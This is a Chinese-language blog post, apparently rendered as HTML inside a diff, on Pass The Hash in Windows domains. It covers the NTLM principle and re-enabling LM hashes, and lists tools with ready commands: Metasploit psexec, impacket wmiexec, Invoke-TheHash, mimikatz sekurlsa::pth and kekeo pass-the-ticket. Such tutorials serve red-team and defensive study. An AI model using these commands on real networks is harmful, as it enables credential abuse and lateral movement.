@@ -1,0 +1,174 @@
+I"�<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>在之前的文章《域渗透——Pass The Hash &amp; Pass The Key》曾介绍过kb2871997对Pass The Hash的影响。本文将站在另一个角度，介绍Pass The Hash的相关实现</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>Pass The Hash的原理</li>
+  <li>常用工具</li>
+  <li>mimikatz中的Pass The Hash</li>
+  <li>mimikatz中的Pass The Ticket</li>
+</ul>
+
+<h2 id="0x02-pass-the-hash的原理">0x02 Pass The Hash的原理</h2>
+<hr />
+
+<p>可参考Wikipedia的介绍，地址如下：</p>
+
+<p>https://en.wikipedia.org/wiki/Pass_the_hash</p>
+
+<p>提取出关键信息：</p>
+
+<ul>
+  <li>在Windows系统中，通常会使用NTLM身份认证</li>
+  <li>NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)</li>
+  <li>hash分为LM hash和NT hash，如果密码长度大于15，那么无法生成LM hash。从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash</li>
+  <li>如果攻击者获得了hash，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)</li>
+</ul>
+
+<p><strong>注：</strong></p>
+
+<p>mimikatz支持导出内存中用户的LM hash，但前提是Windows系统支持LM hash</p>
+
+<p>Windows Server 2008启用LM hash的方法：</p>
+
+<p><code class="language-plaintext highlighter-rouge">gpedit.msc</code>-<code class="language-plaintext highlighter-rouge">计算机配置</code>-<code class="language-plaintext highlighter-rouge">Windows 设置</code>-<code class="language-plaintext highlighter-rouge">安全设置</code>-<code class="language-plaintext highlighter-rouge">本地策略</code>-<code class="language-plaintext highlighter-rouge">安全选项</code></p>
+
+<p>找到<code class="language-plaintext highlighter-rouge">网络安全︰ 不要在下次更改密码存储 LAN 管理器的哈希值</code>，选择<code class="language-plaintext highlighter-rouge">已禁用</code></p>
+
+<p>系统下一次更改密码后，就能够导出LM hash</p>
+
+<h2 id="0x03-常用工具">0x03 常用工具</h2>
+<hr />
+
+<p>当我们获得某个用户的口令hash，并且条件限定我们不去破解明文口令，实现Pass The Hash都有哪些工具呢？</p>
+
+<h3 id="1kali下的工具">1、Kali下的工具</h3>
+
+<h4 id="1-meterpreter">(1) meterpreter</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/windows/smb/psexec_psh
+</code></pre></div></div>
+
+<h4 id="2-工具集">(2) 工具集</h4>
+
+<p>位于<code class="language-plaintext highlighter-rouge">密码攻击</code>-<code class="language-plaintext highlighter-rouge">Passing the Hash</code>下，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-8/1215.png" alt="Alt text" /></p>
+
+<p>包含多种利用工具</p>
+
+<h3 id="2windows系统下的工具">2、Windows系统下的工具</h3>
+
+<h4 id="1-python">(1) python</h4>
+
+<p><strong>wmiexec：</strong></p>
+
+<p>参考地址：</p>
+
+<p>https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py</p>
+
+<p>exe版本下载地址：</p>
+
+<p>https://github.com/maaaaz/impacket-examples-windows</p>
+
+<p><strong>注：</strong></p>
+
+<p>wmiexec.py的注释中提示”Main advantage here is it runs under the user (has to be Admin) account”，经实际测试普通用户权限即可</p>
+
+<p>参数实例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmiexec -hashes 00000000000000000000000000000000:7ECFFFF0C3548187607A14BAD0F88BB1 TEST/test1@192.168.1.1 "whoami"
+</code></pre></div></div>
+
+<p>wmiexec.py的hash参数格式为<code class="language-plaintext highlighter-rouge">LMHASH:NTHASH</code>，由于该Hash来自于Server 2008，系统默认不支持LM hash，所以LM hash可以设定为任意值</p>
+
+<h4 id="2-powershell">(2) powershell</h4>
+
+<p>参考地址：</p>
+
+<p>https://github.com/Kevin-Robertson/Invoke-TheHash/</p>
+
+<p>支持多种方式</p>
+
+<p><strong>Invoke-WMIExec：</strong></p>
+
+<p>参数实例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-WMIExec -Target 192.168.1.1 -Domain test.local -Username test1 -Hash 7ECFFFF0C3548187607A14BAD0F88BB1 -Command "calc.exe" -verbose
+</code></pre></div></div>
+
+<p>类似wmiexec.py</p>
+
+<p><strong>Invoke-SMBExec：</strong></p>
+
+<p>支持SMB1, SMB2 (2.1), and SMB signing</p>
+
+<p>参数实例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-SMBExec -Target 192.168.0.2 -Domain test.local -Username test1 -Hash 7ECFFFF0C3548187607A14BAD0F88BB1 -Command "calc.exe" -verbose
+</code></pre></div></div>
+
+<p>通过在目标主机创建服务执行命令，所以权限为system</p>
+
+<p><strong>Invoke-SMBClient：</strong></p>
+
+<p>支持SMB1, SMB2 (2.1), and SMB signing</p>
+
+<p>如果只有SMB文件共享的权限，没有远程执行权限，可以使用该脚本</p>
+
+<p>支持的功能包括列举目录、上传文件、下载文件、删除文件(具体权限取决于该口令hash的权限)</p>
+
+<h4 id="3-mimikatz">(3) mimikatz</h4>
+
+<p><strong>Pass-The-Hash：</strong></p>
+
+<p>实际上为Overpass-the-hash</p>
+
+<p>参数实例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>privilege::debug
+sekurlsa::pth /user:test1 /domain:test.local /ntlm:c5a237b7e9d8e708d8436b6148a25fa1
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>mimikatz的pth功能需要本地管理员权限，这是由它的实现机制决定的，需要先获得高权限进程lsass.exe的信息</p>
+
+<p>对于8.1/2012r2，安装补丁kb2871997的Win 7/2008r2/8/2012，可以使用AES keys代替NT hash</p>
+
+<p><strong>Pass-The-Ticket：</strong></p>
+
+<p>考虑到mimikatz的pth功能需要本地管理员权限，所以mimikatz也提供了不需要管理员权限的解决方法Pass-The-Ticket</p>
+
+<p>Pass-The-Ticket需要用到gentilkiwi开源的另一款工具kekeo，下载地址：</p>
+
+<p>https://github.com/gentilkiwi/kekeo</p>
+
+<p>参数实例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kekeo "tgt::ask /user:test1 /domain:test.local /ntlm:7ECFFFF0C3548187607A14BAD0F88BB1"
+</code></pre></div></div>
+
+<p>执行后生成票据<code class="language-plaintext highlighter-rouge">TGT_test1@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi</code></p>
+
+<p>接下来导入票据：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kekeo "kerberos::ptt TGT_test1@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi"
+</code></pre></div></div>
+
+<h2 id="0x04-小结">0x04 小结</h2>
+<hr />
+
+<p>本文列举了多种实现Pass The Hash的工具，欢迎补充</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
